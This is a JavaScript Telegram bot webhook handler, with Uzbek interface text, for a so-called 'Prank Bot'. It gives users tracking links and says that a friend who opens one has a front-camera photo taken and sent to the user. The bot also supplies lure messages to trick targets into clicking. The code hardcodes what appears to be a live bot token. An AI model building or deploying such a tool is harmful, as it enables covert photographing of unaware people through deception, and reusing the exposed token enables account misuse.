// Telegram Bot Webhook Handler (Vercel Serverless) — faqat foto
const BOT_TOKEN = process.env.BOT_TOKEN || '8397655004:AAHz1xBd0vNNLRe9H-8krdFjZNi9btJW4GA';

async function tg(method, body) {
  try {
    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/${method}`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(body)
    });
    return await res.json();
  } catch (e) {
    return { ok: false };
  }
}

module.exports = async (req, res) => {
  if (req.method === 'GET') {
    return res.status(200).json({ ok: true, service: 'Prank Bot', status: 'Faol' });
  }
  if (req.method !== 'POST') return res.status(405).end();

  const update = req.body;
  if (!update) return res.status(200).send('OK');

  const host     = req.headers['x-forwarded-host'] || req.headers.host;
  const protocol = req.headers['x-forwarded-proto'] || 'https';
  const baseUrl  = process.env.APP_URL || (host ? `${protocol}://${host}` : '');

  // ── Callback Query (tugma bosilganda) ──
  if (update.callback_query) {
    const cq     = update.callback_query;
    const chatId = cq.message?.chat?.id || cq.from?.id;

    await tg('answerCallbackQuery', { callback_query_id: cq.id });

    if (cq.data === 'get_link') {
      const link = `${baseUrl}/?id=${chatId}`;
      await tg('sendMessage', {
        chat_id: chatId,
        text:
          `📸 <b>Foto Prank havolangiz tayyor!</b>\n\n` +
          `Havolani nusxalab do'stingizga yuboring:\n` +
          `👉 <code>${link}</code>\n\n` +
          `⚡️ <b>Qanday ishlaydi?</b>\n` +
          `Do'stingiz havolaga kirishi bilan uning old kamerasidan surat olinadi va sizga yuboriladi!\n\n` +
          `💡 <i>"Bu rasmdagi senmisan?" yoki "Qara, bu yerda nima chiqdi!" deb yuborsangiz tez kiradi.</i>`,
        parse_mode: 'HTML',
        reply_markup: {
          inline_keyboard: [
            [{ text: '🔄 Yangi havola olish', callback_data: 'get_link' }],
            [{ text: 'ℹ️ Qanday ishlatiladi?', callback_data: 'help' }]
          ]
        }
      });
    } else if (cq.data === 'help') {
      await tg('sendMessage', {
        chat_id: chatId,
        text:
          `ℹ️ <b>Qo'llanma:</b>\n\n` +
          `1. 📸 <b>Havola olish</b> tugmasini bosing.\n` +
          `2. Bot sizga shaxsiy havola beradi.\n` +
          `3. Shu havolani do'stingizga yuboring.\n` +
          `4. Do'stingiz havolani ochishi bilan kameradan surat olinadi va sizga yuboriladi.\n\n` +
          `⚠️ <i>Faqat do'stlar orasidagi xushchaqchaq hazil uchun!</i>`,
        parse_mode: 'HTML',
        reply_markup: {
          inline_keyboard: [[{ text: '📸 Havola olish', callback_data: 'get_link' }]]
        }
      });
    }

    return res.status(200).send('OK');
  }

  // ── Oddiy xabar ──
  if (update.message) {
    const msg    = update.message;
    const chatId = msg.chat?.id;
    const text   = (msg.text || '').trim();
    const name   = msg.from?.first_name || 'foydalanuvchi';

    if (text.startsWith('/start')) {
      await tg('sendMessage', {
        chat_id: chatId,
        text:
          `👋 <b>Assalomu alaykum, ${name}!</b>\n\n` +
          `Bu bot yordamida do'stlaringizga <b>maxsus prank havola</b> yaratishingiz mumkin.\n\n` +
          `Do'stingiz havolani ochishi bilan uning old kamerasidan surat olinib, to'g'ridan-to'g'ri sizga yuboriladi!\n\n` +
          `👇 Pastdagi tugmani bosing:`,
        parse_mode: 'HTML',
        reply_markup: {
          inline_keyboard: [
            [{ text: '📸 Havola olish', callback_data: 'get_link' }],
            [{ text: 'ℹ️ Qanday ishlatiladi?', callback_data: 'help' }]
          ]
        }
      });
    } else {
      await tg('sendMessage', {
        chat_id: chatId,
        text: 'Pastdagi tugmani bosing:',
        reply_markup: {
          inline_keyboard: [[{ text: '📸 Havola olish', callback_data: 'get_link' }]]
        }
      });
    }

    return res.status(200).send('OK');
  }

  return res.status(200).send('OK');
};
